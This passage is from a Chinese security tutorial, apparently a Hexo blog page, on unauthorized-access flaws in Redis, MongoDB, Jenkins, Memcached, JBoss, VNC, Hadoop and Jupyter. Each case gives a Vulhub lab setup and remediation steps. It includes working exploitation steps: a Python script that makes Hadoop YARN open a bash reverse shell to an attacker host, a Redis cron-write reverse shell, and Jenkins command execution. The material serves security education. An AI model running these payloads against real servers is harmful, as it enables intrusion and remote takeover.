title=\"漏洞修复\"></a>漏洞修复</h5><p>1、访问控制策略，限制IP访问，绑定固定IP</p>\n<p>2、在config/elasticsearch.yml中为9200端口设置认证等</p>\n<h4 id=\"Hadoop-未授权访问\"><a href=\"#Hadoop-未授权访问\" class=\"headerlink\" title=\"Hadoop 未授权访问\"></a>Hadoop 未授权访问</h4><h5 id=\"漏洞描述-12\"><a href=\"#漏洞描述-12\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>\n<p>​        Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>\n<h5 id=\"漏洞验证-12\"><a href=\"#漏洞验证-12\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//拉取docker-compose</span><br><span class=\"line\">mkdir hadoop</span><br><span class=\"line\">cd hadoop/</span><br><span class=\"line\">wget https://raw.githubusercontent.com/vulhub/vulhub/master/hadoop/unauthorized-yarn/docker-compose.yml</span><br><span class=\"line\">//编译并启动</span><br><span class=\"line\">docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n<p>1、未授权访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.139:8088/cluster</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709140307458.png\" alt=\"image-20200709140307458\"></p>\n<p>2 、命令执行</p>\n<p>本地监听端口，并执行以下exp脚本。</p>\n<p>exp.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">target = <span class=\"string\">&#x27;http://192.168.18.129:8088/&#x27;</span></span><br><span class=\"line\">lhost = <span class=\"string\">&#x27;192.168.18.138&#x27;</span> <span class=\"comment\"># put your local host ip here, and listen at port 9999</span></span><br><span class=\"line\"></span><br><span class=\"line\">url = target + <span class=\"string\">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class=\"line\">resp = requests.post(url)</span><br><span class=\"line\">app_id = resp.json()[<span class=\"string\">&#x27;application-id&#x27;</span>]</span><br><span class=\"line\">url = target + <span class=\"string\">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;application-id&#x27;</span>: app_id,</span><br><span class=\"line\">    <span class=\"string\">&#x27;application-name&#x27;</span>: <span class=\"string\">&#x27;get-shell&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;commands&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;command&#x27;</span>: <span class=\"string\">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&#x27;application-type&#x27;</span>: <span class=\"string\">&#x27;YARN&#x27;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>\n\n<p>3、反弹shell</p>\n<p><img src=\"/images/Unauthorized/image-20200709140921090.png\" alt=\"image-20200709140921090\"></p>\n<h5 id=\"漏洞修复-12\"><a href=\"#漏洞修复-12\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、如无必要，关闭 Hadoop Web 管理页面</p>\n<p>2、开启身份验证，防止未经授权用户访问</p>\n<p>3、设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口。</p>\n<h4 id=\"Jupyter-Notebook-未授权访问\"><a href=\"#Jupyter-Notebook-未授权访问\" class=\"headerlink\" title=\"Jupyter Notebook 未授权访问\"></a>Jupyter Notebook 未授权访问</h4><h5 id=\"漏洞描述-13\"><a href=\"#漏洞描述-13\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。<br>如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>\n<h5 id=\"漏洞验证-13\"><a href=\"#漏洞验证-13\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget https://raw.githubusercontent.com/vulhub/vulhub/master/jupyter/notebook-rce/docker-compose.yml</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br><span class=\"line\">默认监听8888端口</span><br></pre></td></tr></table></figure>\n\n<p>1、未授权访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.139:8888/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709145828298.png\" alt=\"image-20200709145828298\"></p>\n<p>2、命令执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;172.16.144.139:8888&#x2F;terminals&#x2F;1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709145911206.png\" alt=\"image-20200709145911206\"></p>\n<h5 id=\"漏洞修复-13\"><a href=\"#漏洞修复-13\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、开启身份验证，防止未经授权用户访问</p>\n<p>2、访问控制策略，限制IP访问，绑定固定IP</p>\n<h4 id=\"监听端口\"><a href=\"#监听端口\" class=\"headerlink\" title=\"监听端口\"></a>监听端口</h4><p>以上未授权漏洞程序默认监听端口情况如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Reids\t: 6379</span><br><span class=\"line\">MongoDB : 27017</span><br><span class=\"line\">Jenkins : 8089</span><br><span class=\"line\">Memcached : 11211</span><br><span class=\"line\">JBoss\t:\t8080</span><br><span class=\"line\">VNC :\t5900、5901</span><br><span class=\"line\">Docker\t:\t2375</span><br><span class=\"line\">ZooKeeper : 2181</span><br><span class=\"line\">Rsync\t:\t837</span><br><span class=\"line\">Atlassian Crowd\t:\t8095</span><br><span class=\"line\">Couch DB\t:\t5984</span><br><span class=\"line\">ElasticSearch\t: 9200、9300</span><br><span class=\"line\">Hadoop\t:\t 8088</span><br><span class=\"line\">Jupyter Notebook\t:\t8888</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6103#toc-4</span><br><span class=\"line\">https:&#x2F;&#x2F;paper.seebug.org&#x2F;409&#x2F;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>本文主要介绍和学习关于“未授权访问”漏洞；从字面了解到“未授权”指的是部署的系统未启用认证功能而被直接访问/操作的安全隐患/漏洞。</p>\n<p>感谢前人大佬整理,内容参考网上大佬文章整理，您也可直接<a href=\"https://xz.aliyun.com/t/6103#toc-12\">看这里</a>.漏洞环境参考<a href=\"https://github.com/vulhub/vulhub\">Vulhub</a>,部分环境根据漏洞影响范围来选择安装和搭建.</p>\n<p><img src=\"/images/Unauthorized/image-20200709163151943.png\" alt=\"image-20200709163151943\"></p>\n<center>虚拟机22G</center>\n\n\n<h4 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下环境基本基于centos 7虚拟机部署检测完成。</span><br><span class=\"line\">1.Docker</span><br><span class=\"line\">2.jdk 1.8</span><br><span class=\"line\">3.docker-compose</span><br><span class=\"line\">4.其他参考各漏洞环境搭建部分.</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Redis未授权访问\"><a href=\"#Redis未授权访问\" class=\"headerlink\" title=\"Redis未授权访问\"></a>Redis未授权访问</h4><h5 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p>\n<h5 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> tar xzvf redis-2.8.17.tar.gz</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> redis-2.8.17</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> make</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> src/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cp redis-server /usr/bin/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cp redis-cli /usr/bin/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cp redis.conf /etc/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> redis-server /etc/redis.conf</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200703144429633.png\" alt=\"image-20200703144429633\"></p>\n<p>1、连接Redis</p>\n<p>本地可下载客户端进行连接Redis进行getshell等操作</p>\n<p><img src=\"/images/Unauthorized/image-20200703144858785.png\" alt=\"image-20200703144858785\"></p>\n<p><img src=\"/images/Unauthorized/image-20200703144912904.png\" alt=\"image-20200703144912904\"></p>\n<center>如上图所示连接成功</center>\n2、getshell\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 攻击机执行nc监听</span></span><br><span class=\"line\">nc -lvnp 9999</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Redis客户端执行</span></span><br><span class=\"line\">set shell &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.144.141/9999 0&gt;&amp;1\\n\\n&quot;</span><br><span class=\"line\">config set dir /var/spool/cron</span><br><span class=\"line\">config set dbfilename root</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>还有其他方式进行反弹shell可网上参考</p>\n<p><img src=\"/images/Unauthorized/image-20200704093747944.png\" alt=\"image-20200704093747944\"></p>\n<center>getshell</center>\n\n\n<h5 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、限制登录ip</p>\n<p>2、添加密码</p>\n<p>3、修改默认端口</p>\n<h4 id=\"MongoDB-未授权访问\"><a href=\"#MongoDB-未授权访问\" class=\"headerlink\" title=\"MongoDB 未授权访问\"></a>MongoDB 未授权访问</h4><h5 id=\"漏洞描述-1\"><a href=\"#漏洞描述-1\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​    开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p>\n<p>​    造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p>\n<h5 id=\"漏洞验证-1\"><a href=\"#漏洞验证-1\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//镜像搜索</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker search mongodb</span></span><br><span class=\"line\">//拉取镜像</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker pull mongo</span></span><br><span class=\"line\">//显示mongo镜像</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker images mongo</span></span><br><span class=\"line\">//创建新的容器</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker run -d -p 27017:27017 --name mongodb mongo</span></span><br><span class=\"line\">//显示所有容器</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker ps -a</span></span><br></pre></td></tr></table></figure>\n\n<p>1、NoSQLBooster连接</p>\n<p><img src=\"/images/Unauthorized/image-20200704122547655.png\" alt=\"image-20200704122547655\"></p>\n<h5 id=\"漏洞修复-1\"><a href=\"#漏洞修复-1\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、MongoDB添加认证：MongoDB启动时添加–auth参数、为MongoDB添加用户</p>\n<p>2、启动时加入参数–bind_ip 127.0.0.1 或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1</p>\n<h4 id=\"Jenkins-未授权访问\"><a href=\"#Jenkins-未授权访问\" class=\"headerlink\" title=\"Jenkins 未授权访问\"></a>Jenkins 未授权访问</h4><h5 id=\"漏洞描述-2\"><a href=\"#漏洞描述-2\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>默认情况下 Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。</p>\n<h5 id=\"漏洞验证-2\"><a href=\"#漏洞验证-2\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//安装并启动Jenkins服务</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> rpm -ivh jenkins-2.7.3-1.1.noarch.rpm</span></span><br><span class=\"line\">//修改默认端口</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vim /etc/sysconfig/jenkins</span></span><br><span class=\"line\">JENKINS_PORT=&quot;8089&quot;</span><br><span class=\"line\">//jenkins服务启动</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> service jenkins start</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706091405075.png\" alt=\"image-20200706091405075\"></p>\n<p><img src=\"/images/Unauthorized/image-20200706091522419.png\" alt=\"image-20200706091522419\"></p>\n<p>1、浏览器访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.142:8089/login?from=%2F</span><br><span class=\"line\">//浏览器访问后输入文件内的密码</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vim /var/lib/jenkins/secrets/initialAdminPassword</span></span><br></pre></td></tr></table></figure>\n\n<p>2、未授权访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;系统</span><br><span class=\"line\">http:&#x2F;&#x2F;172.16.144.142:8089&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706094611260.png\" alt=\"image-20200706094611260\"></p>\n<p>3、执行命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">println &quot;whoami&quot;.execute().text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706095024778.png\" alt=\"image-20200706095024778\"></p>\n<h5 id=\"漏洞修复-2\"><a href=\"#漏洞修复-2\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、版本升级</p>\n<p>2、添加认证，设置强密码复杂度及账号锁定</p>\n<p>3、禁止把Jenkins直接暴露在公网</p>\n<h4 id=\"Memcached-未授权访问\"><a href=\"#Memcached-未授权访问\" class=\"headerlink\" title=\"Memcached 未授权访问\"></a>Memcached 未授权访问</h4><h5 id=\"漏洞描述-3\"><a href=\"#漏洞描述-3\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>Memcached是一个自由开源的，高性能，分布式内存对象缓存系统。</p>\n<p>Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。 </p>\n<p> Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。 </p>\n<p> 本质上，它是一个简洁的key-value存储系统。 </p>\n<p>一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。 </p>\n<h5 id=\"漏洞验证-3\"><a href=\"#漏洞验证-3\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//安装</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum install memcached</span></span><br><span class=\"line\">//启动</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> systemctl status  memcached.service</span></span><br><span class=\"line\">//查看默认配置</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cat /etc/sysconfig/memcached</span></span><br></pre></td></tr></table></figure>\n\n<p>1、telnet连接</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet 172.16.144.142 11211</span><br><span class=\"line\">nc -vv 172.16.144.142 11211</span><br><span class=\"line\">无需用户名密码，可以直接连接memcache</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706104012663.png\" alt=\"image-20200706104012663\"></p>\n<p><img src=\"/images/Unauthorized/image-20200706110511684.png\" alt=\"image-20200706110511684\"></p>\n<p>2、nmap检测</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -p 11211 --script memcached-info 172.16.144.142</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706105609418.png\" alt=\"image-20200706105609418\"></p>\n<h5 id=\"漏洞修复-3\"><a href=\"#漏洞修复-3\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>-设置Memchached只允许本地访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OPTIONS=&quot;-l 127.0.0.1&quot;\t\t//只允许本地访问</span><br></pre></td></tr></table></figure>\n\n<p>-禁止外网访问Memcached 11211端口</p>\n<h4 id=\"JBOSS-未授权访问\"><a href=\"#JBOSS-未授权访问\" class=\"headerlink\" title=\"JBOSS 未授权访问\"></a>JBOSS 未授权访问</h4><h5 id=\"漏洞描述-4\"><a href=\"#漏洞描述-4\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 <code>http://ip:8080/jmx-console</code> 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p>\n<h5 id=\"漏洞验证-4\"><a href=\"#漏洞验证-4\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>可参考JBoss漏洞介绍部分</p>\n<p>1、URL访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;172.16.144.157:8080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200702154251373.png\" alt=\"image-20200702154251373\"></p>\n<p>2、访问<code>JMX Console</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;或直接访问这个地址</span><br><span class=\"line\">http:&#x2F;&#x2F;172.16.144.157:8080&#x2F;jmx-console&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200702154332658.png\" alt=\"image-20200702154332658\"></p>\n<p>3、部署远程war</p>\n<p><img src=\"/images/Unauthorized/image-20200702154524903.png\" alt=\"image-20200702154524903\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入远程构造好的war的URL并点击“Invoke”</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200702154726454.png\" alt=\"image-20200702154726454\"></p>\n<h5 id=\"漏洞修复-4\"><a href=\"#漏洞修复-4\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、jmx控制页面访问添加访问验证</p>\n<p>2、JMX Console 安全配置</p>\n<h4 id=\"VNC-未授权访问\"><a href=\"#VNC-未授权访问\" class=\"headerlink\" title=\"VNC 未授权访问\"></a>VNC 未授权访问</h4><h5 id=\"漏洞描述-5\"><a href=\"#漏洞描述-5\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制target主机。</p>\n<h5 id=\"漏洞验证-5\"><a href=\"#漏洞验证-5\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">需要用gnome桌面，如果服务器安装时使用的最小化安装，那么进行下面操作按章GNOME 桌面</span><br><span class=\"line\">yum grouplist\t\t\t\t\t\t\t\t\t\t\t\t\t\t# 列出的组列表里有GNOME Desktop</span><br><span class=\"line\">yum groupinstall -y &quot;GNOME Desktop&quot;\t\t\t# 安装</span><br><span class=\"line\">systemctl set-default graphical.target  //设置成图形模式</span><br><span class=\"line\">systemctl set-default multi-user.target  //设置成命令模式</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 然后重启即可，或者startx开启图形界面。第一次启动可能时间会长一点，耐心等待即可。</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum install tigervnc-server -y</span></span><br><span class=\"line\">//新建服务配置模版</span><br><span class=\"line\">cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@:1.service</span><br><span class=\"line\">vim /etc/systemd/system/vncserver@\\:1.service</span><br><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Remote desktop service (VNC)</span><br><span class=\"line\">After=syslog.target network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=forking</span><br><span class=\"line\">User=root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Clean any existing files <span class=\"keyword\">in</span> /tmp/.X11-unix environment</span></span><br><span class=\"line\">ExecStartPre=-/usr/bin/vncserver -kill %i</span><br><span class=\"line\">ExecStart=/sbin/runuser -l root -c &quot;/usr/bin/vncserver %i&quot;</span><br><span 